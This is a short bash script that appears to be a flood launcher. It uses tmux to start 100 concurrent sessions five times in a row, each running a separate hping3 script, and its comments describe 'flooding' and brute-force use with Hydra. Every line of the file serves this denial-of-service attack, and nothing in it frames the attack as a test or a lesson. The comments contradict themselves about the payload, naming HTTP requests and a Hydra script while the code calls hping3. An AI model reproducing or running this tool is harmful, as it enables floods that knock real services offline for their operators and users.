#!/bin/bash

# This is the Multiplexer to run 100 no. of Terminals
# offering concurrent bash running the same Brute-force script
# bash hydra-hardcode.sh * 100 concurrency;
# Max. sessions = 100 for a 16CPU +　16GB RAM VM

# You may try out this Multiplexer on a super-computer :D
script='./hping3.sh';

# Trial & Error tested
# maximum of 100 sessions can be handled by a 16 CPU + 16GB RAM VM
sessions=100;

# Asynchronous / Concurrent HTTP requests flooding
# 5 Flooding synchronously
# Flood 1
for ((i=0; i<$sessions; i++));
do
    tmux new-session -d -s "session${i}" "bash ${script}";
done

# Flood 2
for ((i=0; i<$sessions; i++));
do
    tmux new-session -d -s "session${i}" "bash ${script}";
done

# Flood 3
for ((i=0; i<$sessions; i++));
do
    tmux new-session -d -s "session${i}" "bash ${script}";
done

# Flood 4
for ((i=0; i<$sessions; i++));
do
    tmux new-session -d -s "session${i}" "bash ${script}";
done
# Flood 5
for ((i=0; i<$sessions; i++));
do
    tmux new-session -d -s "session${i}" "bash ${script}";
done